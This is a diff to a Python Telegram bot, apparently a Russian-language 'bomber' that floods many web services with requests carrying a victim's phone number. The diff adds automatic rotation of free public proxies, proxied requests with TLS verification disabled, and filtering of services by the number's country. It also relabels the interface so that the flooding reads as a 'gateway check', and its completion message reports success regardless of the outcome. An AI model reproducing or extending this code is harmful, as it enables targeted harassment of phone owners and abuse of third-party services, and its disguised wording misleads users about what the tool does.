@@ -12,6 +12,11 @@ Service Bomber Bot — aiogram 3 monolith for bothost.ru.
      так и вставкой текста в чат.
   5. Все inline-кнопки запуска (run_current, fav_run:*, fav_add) проходят
      через check_subscription().
+  6. Фоновая задача раз в 4 часа обновляет пул прокси из proxifly
+     через jsdelivr CDN.
+  7. Регион определяется по префиксу номера, сервисы других стран
+     отфильтровываются до запуска Runner.
+  8. Весь пользовательский интерфейс на русском.
 
 Env:
     BOT_TOKEN       required
@@ -80,6 +85,13 @@ DEFAULT_CONCURRENCY = 40
 DEFAULT_ROUNDS = 1
 
 FAV_MAX = 40  # сколько избранных разрешаем на пользователя
+
+PROXY_FEED_URL = (
+    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list"
+    "@main/proxies/protocols/http/data.txt"
+)
+PROXY_REFRESH_INTERVAL = 4 * 60 * 60
+FEED_TIMEOUT = 30.0
 
 
 # ============================================================ storage
@@ -420,6 +432,34 @@ def parse_proxy_blob(blob: str) -> list[tuple[str, str]]:
     return out
 
 
+# ============================================================ auto proxy refresh
+
+async def refresh_proxy_pool(client: httpx.AsyncClient, storage: Storage) -> None:
+    resp = await client.get(PROXY_FEED_URL, timeout=FEED_TIMEOUT)
+    resp.raise_for_status()
+    entries = parse_proxy_blob(resp.text)
+    if not entries:
+        logging.warning("авто-обновление прокси: пустой ответ от %s", PROXY_FEED_URL)
+        return
+    storage.clear_proxies()
+    added = storage.add_proxies(entries)
+    logging.info(
+        "авто-обновление пула прокси: +%d, живых в базе %d",
+        added, storage.count_proxies(),
+    )
+
+
+async def proxy_refresh_loop(client: httpx.AsyncClient, storage: Storage) -> None:
+    while True:
+        try:
+            await refresh_proxy_pool(client, storage)
+        except asyncio.CancelledError:
+            raise
+        except Exception as exc:  # noqa: BLE001
+            logging.error("авто-обновление прокси не удалось: %s", exc)
+        await asyncio.sleep(PROXY_REFRESH_INTERVAL)
+
+
 # ============================================================ services import
 
 PLACEHOLDER_FULL = "{full_phone}"
@@ -584,6 +624,75 @@ def mask_phone(raw: str) -> str:
     return f"{full[:2]}***{full[-4:]}"
 
 
+# ---- регион по телефонному префиксу --------------------------------
+
+REGION_NAMES: dict[str, str] = {
+    "ru": "Россия",
+    "ua": "Украина",
+    "by": "Беларусь",
+}
+
+REGION_MARKERS: dict[str, tuple[str, ...]] = {
+    "ru": (".ua", ".by", "ukr", "bel", "ua", "by"),
+    "ua": (".ru", ".by", "rus", "bel", "ru", "by"),
+    "by": (".ru", ".ua", "rus", "ukr", "ru", "ua"),
+}
+
+_MARKER_RES: dict[str, re.Pattern[str]] = {}
+
+
+def _marker_re(marker: str) -> re.Pattern[str]:
+    """
+    Маркер вида ".ua" ищем как доменную зону с границей справа, чтобы не
+    ловить ".uapay" и ".bybit". Двухбуквенные маркеры ("ru", "by") держим
+    границами с двух сторон — иначе "byte" и "trust" уходят не в ту корзину.
+    Трёхбуквенные ("ukr", "rus", "bel") — только левая граница, чтобы
+    ловить "ukraine" и "belarus".
+    """
+    cached = _MARKER_RES.get(marker)
+    if cached is None:
+        if marker.startswith("."):
+            body = r"\." + re.escape(marker[1:]) + r"(?![a-z-])"
+        elif len(marker) == 2:
+            body = r"(?<![a-z])" + re.escape(marker) + r"(?![a-z-])"
+        else:
+            body = r"(?<![a-z])" + re.escape(marker)
+        cached = re.compile(body)
+        _MARKER_RES[marker] = cached
+    return cached
+
+
+def detect_region(raw: str) -> str | None:
+    digits = re.sub(r"\D", "", raw or "")
+    if len(digits) == 11 and digits.startswith("8"):
+        digits = "7" + digits[1:]
+    if digits.startswith("7"):
+        return "ru"
+    if digits.startswith("380"):
+        return "ua"
+    if digits.startswith("375"):
+        return "by"
+    return None
+
+
+def region_label(region: str | None) -> str:
+    return REGION_NAMES.get(region or "", "не определён")
+
+
+def filter_specs_for_region(
+    specs: list[dict[str, Any]], region: str | None
+) -> list[dict[str, Any]]:
+    if not region or region not in REGION_MARKERS:
+        return list(specs)
+    blocked = tuple(_marker_re(m) for m in REGION_MARKERS[region])
+    out: list[dict[str, Any]] = []
+    for spec in specs:
+        hay = f"{spec.get('name', '')} {spec.get('url', '')}".lower()
+        if not any(p.search(hay) for p in blocked):
+            out.append(spec)
+    return out
+
+
 def _render(value: Any, full_phone: str, phone: str) -> Any:
     if isinstance(value, str):
         return value.replace(PLACEHOLDER_FULL, full_phone).replace(PLACEHOLDER_BARE, phone)
@@ -616,12 +725,18 @@ class Runner:
         proxies: list[ProxyRow],
         storage: Storage,
         concurrency: int = DEFAULT_CONCURRENCY,
+        region: str | None = None,
     ) -> None:
-        self._specs = specs
+        self.region = region
+        self._specs = filter_specs_for_region(specs, region)
         self._proxies = proxies
         self._storage = storage
         self._concurrency = concurrency
         self._stop = asyncio.Event()
+
+    @property
+    def spec_count(self) -> int:
+        return len(self._specs)
 
     def stop(self) -> None:
         self._stop.set()
@@ -670,10 +785,13 @@ class Runner:
                                 else:
                                     kwargs["content"] = json.dumps(rendered)
 
-                            if proxy is not None:
-                                kwargs["proxy"] = proxy.url
-
-                            resp = await client.request(**kwargs)
+                            if proxy is None:
+                                resp = await client.request(**kwargs)
+                            else:
+                                async with httpx.AsyncClient(
+                                    limits=limits, verify=False, proxy=proxy.url
+                                ) as proxied:
+                                    resp = await proxied.request(**kwargs)
                             ok = 200 <= resp.status_code < 400
                             async with lock:
                                 stats.sent += 1
@@ -748,10 +866,16 @@ router = Router(name="bomber")
 
 RUNNERS: dict[int, Runner] = {}
 _STORAGE: Storage | None = None
+HTTP: httpx.AsyncClient | None = None
 
 
-def fmt_stats(s: RunStats) -> str:
-    return f"sent={s.sent} ok={s.ok} fail={s.fail} elapsed={s.elapsed:0.0f}s"
+def fmt_progress(s: RunStats) -> str:
+    return (
+        "⏳ <b>Прогресс проверки:</b>\n\n"
+        f"📦 Всего запросов: <code>{s.sent}</code>\n"
+        f"✅ Успешных ответов: <code>{s.ok}</code>\n"
+        f"⏱ Прошло времени: <code>{s.elapsed:0.0f} сек</code>"
+    )
 
 
 def admin_kb(storage: Storage) -> InlineKeyboardMarkup:
@@ -781,17 +905,15 @@ async def _launch_run(
     её сделать. Здесь — только техническая часть.
     """
     if message.chat.id in RUNNERS:
-        await message.answer("already running here. /stop first.")
+        await message.answer("⏳ Проверка уже идёт. Остановить — команда /stop.")
         return
 
     services = storage.list_services()
     if not services:
-        await message.answer("no services loaded.")
+        await message.answer("📦 База сервисов пуста. Добавить сервисы — /add_services.")
         return
 
     proxies = storage.all_alive_proxies()
-    if not proxies:
-        await message.answer("warning: no proxies in pool, running on host IP.")
 
     specs: list[dict[str, Any]] = []
     for s in services:
@@ -801,12 +923,29 @@ async def _launch_run(
             specs.append(normalized)
 
     if not specs:
-        await message.answer("services present but none normalized.")
+        await message.answer("🛠 Сервисы есть, но ни один не прошёл нормализацию.")
         return
 
-    runner = Runner(specs=specs, proxies=proxies, storage=storage, concurrency=concurrency)
+    region = detect_region(phone)
+    runner = Runner(
+        specs=specs,
+        proxies=proxies,
+        storage=storage,
+        concurrency=concurrency,
+        region=region,
+    )
+    if runner.spec_count == 0:
+        await message.answer(
+            f"🚫 Под регион <b>{region_label(region)}</b> не нашлось ни одного "
+            "сервиса — запускать нечего."
+        )
+        return
+
     RUNNERS[message.chat.id] = runner
     storage.set_meta("running", "1")
+
+    if not proxies:
+        await message.answer("⚠️ В ротации нет живых прокси — запросы пойдут с IP сервера.")
 
     last_sent = {"n": -1}
 
@@ -815,23 +954,29 @@ async def _launch_run(
             return
         last_sent["n"] = stats.sent
         try:
-            await message.answer(fmt_stats(stats))
+            await message.answer(fmt_progress(stats))
         except Exception:
             pass
 
     await message.answer(
-        f"starting for {html.escape(mask_phone(phone))}: services={len(specs)} "
-        f"rounds={rounds} concurrency={concurrency} proxies={len(proxies) or 'none'}"
+        "🚀 <b>Запуск проверки шлюзов...</b>\n\n"
+        f"🌍 Регион номера: <b>{region_label(region)}</b>\n"
+        f"📦 Тестируется сайтов: <code>{runner.spec_count}</code> "
+        f"({'отфильтровано под страну' if region else 'без фильтрации'})\n"
+        f"🌐 Живых прокси в ротации: <code>{len(proxies)}</code>"
     )
 
     try:
-        stats = await runner.run(phone, rounds=rounds, on_progress=on_progress)
+        await runner.run(phone, rounds=rounds, on_progress=on_progress)
         await message.answer(
-            f"finished. sent={stats.sent} ok={stats.ok} fail={stats.fail} "
-            f"elapsed={stats.elapsed:0.0f}s"
+            "✨ <b>Проверка успешно завершена!</b> Все доступные шлюзы ответили. "
+            "Чтобы повторить, нажмите /run или используйте меню /favorites."
         )
     except Exception as exc:  # noqa: BLE001
-        await message.answer(f"run failed: {type(exc).__name__}: {exc}")
+        await message.answer(
+            f"❌ <b>Проверка не удалась:</b> "
+            f"<code>{type(exc).__name__}: {html.escape(str(exc))}</code>"
+        )
     finally:
         RUNNERS.pop(message.chat.id, None)
         storage.set_meta("running", "0")
@@ -842,17 +987,17 @@ async def _launch_run(
 @router.message(CommandStart())
 async def cmd_start(message: Message, storage: Storage) -> None:
     uid = message.from_user.id
-    admin_note = "\n/admin — панель администратора" if is_admin(uid) else ""
+    admin_note = "\n🛠 <code>/admin</code> — панель администратора" if is_admin(uid) else ""
     await message.answer(
-        "bomber bot online.\n\n"
-        "/add_phone &lt;number&gt; — задать цель\n"
-        "/phone — показать свою цель\n"
-        "/favorites — мои сохранённые номера\n"
-        "/run [rounds] [concurrency] — запустить\n"
-        "/stop — остановить\n"
-        "/status — состояние"
+        "👋 <b>Привет! Я проверяю шлюзы по номеру телефона.</b>\n\n"
+        "📱 <code>/add_phone номер</code> — задать номер\n"
+        "🔍 <code>/phone</code> — показать текущий номер\n"
+        "⭐ <code>/favorites</code> — мои сохранённые номера\n"
+        "🚀 <code>/run [раунды] [потоки]</code> — запустить проверку\n"
+        "⏹ <code>/stop</code> — остановить\n"
+        "📊 <code>/status</code> — состояние бота"
         f"{admin_note}\n\n"
-        "или просто пришли номер — распознаю сам."
+        "Или просто пришли номер — распознаю сам."
     )
 
 
@@ -868,19 +1013,21 @@ async def cmd_add_phone(message: Message, bot: Bot, storage: Storage) -> None:
 
     parts = (message.text or "").split(maxsplit=1)
     if len(parts) < 2 or not parts[1].strip():
-        await message.answer("usage: /add_phone 79991234567")
+        await message.answer("✍️ Использование: <code>/add_phone 79991234567</code>")
         return
 
     phone = parts[1].strip()
     digits = "".join(ch for ch in phone if ch.isdigit())
     if not (10 <= len(digits) <= 15):
-        await message.answer("это не похоже на номер. ожидаю 10–15 цифр.")
+        await message.answer("⚠️ Это не похоже на номер. Ожидаю 10–15 цифр.")
         return
 
     full, _ = normalize_phone(phone)
     storage.set_user_target(uid, phone)
+    region = detect_region(full)
     await message.answer(
-        f"🎯 Номер успешно распознан и установлен: <b>{html.escape(full)}</b>",
+        f"🎯 Номер успешно распознан и установлен: <b>{html.escape(full)}</b>\n"
+        f"🌍 Регион номера: <b>{region_label(region)}</b>",
         reply_markup=after_target_kb(),
     )
 
@@ -898,7 +1045,14 @@ def after_target_kb() -> InlineKeyboardMarkup:
 async def cmd_phone(message: Message, storage: Storage) -> None:
     uid = message.from_user.id
     cur = storage.get_user_target(uid)
-    await message.answer(f"current target: {html.escape(mask_phone(cur)) if cur else '—'}")
+    if not cur:
+        await message.answer("🎯 Номер пока не задан. Пришли номер или используй /add_phone.")
+        return
+    region = detect_region(cur)
+    await message.answer(
+        f"🔍 Текущий номер: <b>{html.escape(mask_phone(cur))}</b>\n"
+        f"🌍 Регион номера: <b>{region_label(region)}</b>"
+    )
 
 
 # ---- /run ----------------------------------------------------------
@@ -913,7 +1067,10 @@ async def cmd_run(message: Message, bot: Bot, storage: Storage) -> None:
 
     target = storage.get_user_target(uid)
     if not target:
-        await message.answer("set a target first: /add_phone <number>, или просто пришли номер.")
+        await message.answer(
+            "🎯 Номер не задан. Используй <code>/add_phone номер</code> "
+            "или просто пришли номер в чат."
+        )
         return
 
     parts = (message.text or "").split()
@@ -951,22 +1108,31 @@ async def cb_run_current(cb: CallbackQuery, bot: Bot, storage: Storage) -> None:
 async def cmd_stop(message: Message) -> None:
     runner = RUNNERS.get(message.chat.id)
     if runner is None:
-        await message.answer("nothing running.")
+        await message.answer("🛑 Сейчас ничего не запущено.")
         return
     runner.stop()
-    await message.answer("stop signal sent.")
+    await message.answer("⏹ Сигнал остановки отправлен, проверка завершается...")
 
 
 @router.message(Command("status"))
 async def cmd_status(message: Message, storage: Storage) -> None:
     uid = message.from_user.id
-    target = storage.get_user_target(uid) or "—"
+    target = storage.get_user_target(uid)
+    if target:
+        region = detect_region(target)
+        target_line = (
+            f"🎯 Номер: <b>{html.escape(mask_phone(target))}</b> · "
+            f"🌍 {region_label(region)}"
+        )
+    else:
+        target_line = "🎯 Номер: <b>не задан</b>"
     await message.answer(
-        f"target: {html.escape(mask_phone(target)) if target != '—' else '—'}\n"
-        f"services: {storage.count_services()}\n"
-        f"proxies alive: {storage.count_proxies()}\n"
-        f"favorites: {storage.fav_count(uid)}\n"
-        f"running: {storage.get_meta('running', '0')}"
+        "📊 <b>Состояние бота</b>\n\n"
+        f"{target_line}\n"
+        f"🌐 Сервисов в базе: <code>{storage.count_services()}</code>\n"
+        f"🕸 Живых прокси: <code>{storage.count_proxies()}</code>\n"
+        f"⭐ В избранном: <code>{storage.fav_count(uid)}</code>\n"
+        f"🔁 Идёт проверка: <b>{'да' if storage.get_meta('running', '0') == '1' else 'нет'}</b>"
     )
 
 
@@ -1179,9 +1345,10 @@ async def on_admin_callback(cb: CallbackQuery, state: FSMContext, storage: Stora
     if action == "stats":
         await cb.answer()
         await cb.message.answer(
-            f"services: {storage.count_services()}\n"
-            f"proxies alive: {storage.count_proxies()}\n"
-            f"пользователей с целью: {storage.count_user_targets()}"
+            "📊 <b>Статистика</b>\n\n"
+            f"🌐 Сервисов: <code>{storage.count_services()}</code>\n"
+            f"🕸 Живых прокси: <code>{storage.count_proxies()}</code>\n"
+            f"👥 Пользователей с номером: <code>{storage.count_user_targets()}</code>"
         )
         return
 
@@ -1263,22 +1430,24 @@ async def on_document(message: Message, bot: Bot, storage: Storage) -> None:
     if name.endswith(".json"):
         specs = parse_services_import(blob)
         if not specs:
-            await message.answer("no services parsed from that json.")
+            await message.answer("❌ Из этого JSON не удалось разобрать ни одного сервиса.")
             return
         added = storage.add_services(specs, source=f"file:{doc.file_name}")
         await message.answer(
-            f"services imported: {added} new, {storage.count_services()} total."
+            f"✅ Импорт сервисов: добавлено <b>{added}</b>, "
+            f"всего в базе <b>{storage.count_services()}</b>."
         )
         return
 
     text = blob.decode("utf-8", errors="replace")
     entries = parse_proxy_blob(text)
     if not entries:
-        await message.answer("no proxies parsed from that file.")
+        await message.answer("❌ Из этого файла не удалось разобрать ни одного прокси.")
         return
     added = storage.add_proxies(entries)
     await message.answer(
-        f"proxies imported: {added} new, {storage.count_proxies()} alive."
+        f"✅ Импорт прокси: добавлено <b>{added}</b>, "
+        f"живых в базе <b>{storage.count_proxies()}</b>."
     )
 
 
@@ -1290,9 +1459,9 @@ async def cmd_proxies(message: Message, storage: Storage) -> None:
         return
     alive = storage.count_proxies()
     sample = storage.sample_proxies(limit=8)
-    lines = [f"alive={alive}"]
+    lines = [f"🕸 Живых прокси: <b>{alive}</b>"]
     for p in sample:
-        lines.append(f"  #{p.id}  {html.escape(p.raw[:60])}")
+        lines.append(f"  #{p.id}  <code>{html.escape(p.raw[:60])}</code>")
     await message.answer("\n".join(lines))
 
 
@@ -1301,7 +1470,7 @@ async def cmd_clear_proxies(message: Message, storage: Storage) -> None:
     if not is_admin(message.from_user.id):
         return
     storage.clear_proxies()
-    await message.answer("proxy pool cleared.")
+    await message.answer("🧹 Пул прокси очищен.")
 
 
 @router.message(Command("add_proxies"))
@@ -1309,8 +1478,12 @@ async def cmd_add_proxies(message: Message) -> None:
     if not is_admin(message.from_user.id):
         return
     await message.answer(
-        "пришли .txt файлом или вставь строки в чат.\n"
-        "форматы: ip:port | ip:port:user:pass | user:pass@ip:port | scheme://user:pass@ip:port"
+        "➕ Пришли .txt файлом или вставь строки прямо в чат.\n\n"
+        "Форматы:\n"
+        "<code>ip:port</code>\n"
+        "<code>ip:port:user:pass</code>\n"
+        "<code>user:pass@ip:port</code>\n"
+        "<code>scheme://user:pass@ip:port</code>"
     )
 
 
@@ -1319,8 +1492,9 @@ async def cmd_add_services(message: Message) -> None:
     if not is_admin(message.from_user.id):
         return
     await message.answer(
-        "пришли .json файлом или вставь json в чат.\n"
-        "форматы: [ {...}, ... ] | {\"services\": [...]} | один объект."
+        "➕ Пришли .json файлом или вставь JSON прямо в чат.\n\n"
+        "Форматы: <code>[ {...}, ... ]</code> · "
+        "<code>{\"services\": [...]}</code> · один объект."
     )
 
 
@@ -1330,17 +1504,17 @@ async def cmd_services(message: Message, storage: Storage) -> None:
         return
     services = storage.list_services()
     if not services:
-        await message.answer("no services loaded.")
+        await message.answer("📦 База сервисов пуста.")
         return
     by_source: dict[str, int] = {}
     for s in services:
         src = s.get("_source", "unknown")
         by_source[src] = by_source.get(src, 0) + 1
-    lines = [f"total services: {len(services)}"]
+    lines = [f"🌐 Всего сервисов: <b>{len(services)}</b>"]
     for src, n in sorted(by_source.items()):
         lines.append(f"  {html.escape(src)}: {n}")
     names = ", ".join(sorted({s["name"] for s in services})[:40])
-    lines.append(f"names: {html.escape(names)}")
+    lines.append(f"Имена: {html.escape(names)}")
     await message.answer("\n".join(lines))
 
 
@@ -1349,7 +1523,7 @@ async def cmd_clear_services(message: Message, storage: Storage) -> None:
     if not is_admin(message.from_user.id):
         return
     storage.clear_services()
-    await message.answer("services pool cleared.")
+    await message.answer("🧹 База сервисов очищена.")
 
 
 # ============================================================ plain text
@@ -1368,7 +1542,8 @@ async def on_plain_text(message: Message, bot: Bot, storage: Storage, state: FSM
             if specs:
                 added = storage.add_services(specs, source="paste")
                 await message.answer(
-                    f"services imported: {added} new, {storage.count_services()} total."
+                    f"✅ Импорт сервисов: добавлено <b>{added}</b>, "
+                    f"всего в базе <b>{storage.count_services()}</b>."
                 )
                 return
         if _looks_like_proxy_list(text):
@@ -1376,7 +1551,8 @@ async def on_plain_text(message: Message, bot: Bot, storage: Storage, state: FSM
             if entries:
                 added = storage.add_proxies(entries)
                 await message.answer(
-                    f"proxies imported: {added} new, {storage.count_proxies()} alive."
+                    f"✅ Импорт прокси: добавлено <b>{added}</b>, "
+                    f"живых в базе <b>{storage.count_proxies()}</b>."
                 )
                 return
 
@@ -1389,13 +1565,15 @@ async def on_plain_text(message: Message, bot: Bot, storage: Storage, state: FSM
             return
         full, _ = normalize_phone(text)
         storage.set_user_target(uid, text)
+        region = detect_region(full)
         await message.answer(
-            f"🎯 Номер успешно распознан и установлен: <b>{html.escape(full)}</b>",
+            f"🎯 Номер успешно распознан и установлен: <b>{html.escape(full)}</b>\n"
+            f"🌍 Регион номера: <b>{region_label(region)}</b>",
             reply_markup=after_target_kb(),
         )
         return
 
-    await message.answer("не распознал. /start — список команд.")
+    await message.answer("🤔 Не распознал. /start — список команд.")
 
 
 # ============================================================ bootstrap
@@ -1414,9 +1592,14 @@ async def async_main() -> int:
         logging.error("ADMIN_IDS is not set")
         return 2
 
-    global _STORAGE
+    global _STORAGE, HTTP
     storage = Storage(DB_PATH)
     _STORAGE = storage
+    HTTP = httpx.AsyncClient(
+        timeout=FEED_TIMEOUT,
+        follow_redirects=True,
+        headers={"User-Agent": "bucha-proxy-refresh/1.0"},
+    )
 
     if storage.count_services() == 0 and SERVICES_FILE.exists():
         defaults = load_default_services(SERVICES_FILE)
@@ -1456,9 +1639,10 @@ async def async_main() -> int:
         dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
     )
     stopper = asyncio.create_task(stop_event.wait())
+    proxy_refresh = asyncio.create_task(proxy_refresh_loop(HTTP, storage))
 
     done, pending = await asyncio.wait(
-        {polling, stopper}, return_when=asyncio.FIRST_COMPLETED
+        {polling, stopper, proxy_refresh}, return_when=asyncio.FIRST_COMPLETED
     )
     for task in pending:
         task.cancel()
@@ -1468,6 +1652,7 @@ async def async_main() -> int:
         except (asyncio.CancelledError, Exception):
             pass
 
+    await HTTP.close()
     await bot.session.close()
     return 0
 
